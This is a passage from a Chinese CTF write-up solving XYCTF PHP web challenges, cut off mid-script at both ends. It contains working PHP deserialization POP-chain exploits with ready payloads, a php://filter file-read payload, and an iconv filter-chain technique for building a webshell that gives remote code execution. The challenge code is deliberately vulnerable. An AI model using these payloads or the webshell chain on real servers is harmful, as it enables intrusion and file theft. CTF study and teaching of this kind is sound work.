class="variable">$mack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;wang1=<span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;mack=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;luo=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;lao=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;chen=<span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;name=<span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;num=<span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eefc5b93.png" alt="image-20240410202358282"></p><p>下一层</p><p>saber_master_saber_master.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这一层稍微难一点</p><p>首先一眼就看到<code>echo new $_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>并且没有其他的可以执行命令的地方 所以这就是链子的终点(XYCTFNO3)  而我们一传CTF反序列化后会触发__wakeup 所以这也是链子的起点(XYCTFNO3)</p><p>而__wakeup会触发$this-&gt;XY();也就是可以到链子的终点</p><p>因此使$this-&gt;KickyMu-&gt;XYCTF()为true就是这道题的重点</p><p>但是明显KickyMu-&gt;XYCTF()这样肯定是不能这样调用的 所以我们要将KickyMu赋成其他值</p><p>XYCTF()在XYCTFNO2中 所以我们要将KickyMu赋成XYCTFNO2</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> False;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> True;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>XYCTF()要为true 就必须<code>$this-&gt;adwa-&gt;crypto0 != &#39;dev1l&#39; or $this-&gt;adwa-&gt;T1ng != &#39;yuroandCMD258&#39;</code>   adwa是一个属性 里面肯定没有crypto0 T1ng 属性  所以直接执行这段代码肯定是不行的</p><p>所以我们要把adwa赋成XYCTFNO2或者XYCTFNO1</p><p>再将crypto0 T1ng赋值就行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;N1ght=oSthing;</span><br><span class="line"><span class="variable">$c</span>-&gt;KickyMu=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;adwa=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;T1ng=<span class="string">&quot;yuroandCMD258&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;crypto0=<span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A3%3A%22Liu%22%3BN%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441eee9bd48.png" alt="image-20240410204921710"></p><p>好 接下来就是读文件了 </p><p><code>echo new $_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>传参x y</p><p>x明显要传一个函数 y传一个参数</p><p>这里要用到原生类了 原生类就那么几个 随便查查就知道了</p><blockquote><p>X&#x3D;SplFileObject&amp;Y&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p><img src="https://bu.dusays.com/2024/05/15/66441eee6e74b.png" alt="image-20240410205200399"></p><p>最后base64解密就行</p><p><img src="https://bu.dusays.com/2024/05/15/66441eee6c248.png" alt="image-20240410205250455"></p><h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>给了源码附件</p><p>进去是一个连连看</p><p><img src="https://bu.dusays.com/2024/05/15/66441f363534e.png" alt="image-20240410205642231"></p><p>看了下f12 没什么信息</p><p>直接看附件</p><p><img src="https://bu.dusays.com/2024/05/15/66441f34e883a.png" alt="image-20240410205730711"></p><p>两个重要文件 index.php和what’s_this.php</p><p>明显 index.php是这个js连连看的网页源码 看下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/readme\.txt/&#x27;</span>, <span class="variable">$payload</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;一个简单的js版连连看游戏(或许通关就有flag?【也可能只是或许！】)&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;想做文件包含？请跳转what&#x27;s_this.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;连连看&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">heading</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">time</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">id</span>=&quot;<span class="title">restart</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;<span class="title">restart</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./?<span class="title">file</span>=<span class="title">readme</span>.<span class="title">txt</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;<span class="title">about</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">grid</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">config</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">util</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">view</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">game</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">event</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">main</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/readme\.txt/&#x27;</span>, <span class="variable">$payload</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;一个简单的js版连连看游戏(或许通关就有flag?【也可能只是或许！】)&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;想做文件包含？请跳转what&#x27;s_this.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>get传一个file后 第一个echo明显没什么用(刚刚不是看了js代码嘛) 第二个echo叫我们访问what’s_this.php 看下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<code>highlight_file(__FILE__)</code>和跳转what’s_this.php 这个文件应该是可以直接访问的 试下</p><p><img src="https://bu.dusays.com/2024/05/15/66441f3545877.png" alt="image-20240410210234256"></p><p>没问题 </p><p>有点懵</p><p>找到一道相似的题 但是这道更难 waf</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;php://filter/<span class="subst">$a</span>/resource=/dev/null&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>)===<span class="string">&quot;2024&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题的非预期解是<code>POST：1=resource=data:,2024&lt;|string.strip_tags|</code></p><p>|string.strip_tags|这是将一些脏字符回收了</p><p>但是这道题过滤了<code>=</code> 所以这个payload不能用</p><p>但是这道题还有预期解：</p><blockquote><p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE </p><p>PHP Base64 Filter中合法字符只有<code>A-Za-z0-9\/\=\+</code>，其他字符会自动被忽略，包括不可见字符、控制字符什么的</p><p>并且我们可以通过编码形式，构造产生自己想要的内容</p><p>PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从 <code>iconv -l</code> 获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p><p>我们可以通过 iconv 来将 UTF-8 字符集转换到 UTF-7 字符集</p><p>所以可以利用一些固定文件内容来产生 webshell  结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符</p><p>那我们应该怎么构造需要的内容呢？因为 base64 编码合法字符里面并没有尖括号，所以我们不能通过以上方式直接产生 PHP 代码进行包含，但是我们可以通过以上技巧来产生一个 base64 字符串，最后再使用一次 base64 解码一次就可以了。</p><p>例如我们生成 <code>PAaaaaa</code> ，最后经过 base64 解码得到第一个字符为 &lt; ，后续为其他不需要的字符（我们这里不需要的字符称为垃圾字符）的字符串。</p><p>所以我们接下来需要做的，就是利用以上技巧找到这么一类编码，可以只存在我们需要的构造一个 webshell 的 base64 字符串了。</p><p>因为最终的 base64 字符串，是由 iconv 相对应的编码规则生成的，所以我们最好通过已有的编码规则来适当地匹配自己想要的 webshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?=`$_GET[0]`;;?&gt;</span><br></pre></td></tr></table></figure><p>以上 payload 的 base64 编码为 <code>PD89YCRfR0VUWzBdYDs7Pz4=</code> ，而如果只使用了一个分号，则编码结果为 <code>PD89YCRfR0VUWzBdYDs/Pg==</code> ，这里 7 可能相对于斜杠比较好找一些，也可能是 exp 作者没有 fuzz 或者找到斜杠的生成规则，所以作者这里使用了两个分号避开了最终 base64 编码中的斜杠。</p><p>根据以上规则，再将其反推回去即可，可以验证一下我们得到的结果 脚本：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$base64_payload</span> = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">&gt;<span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">&gt;<span 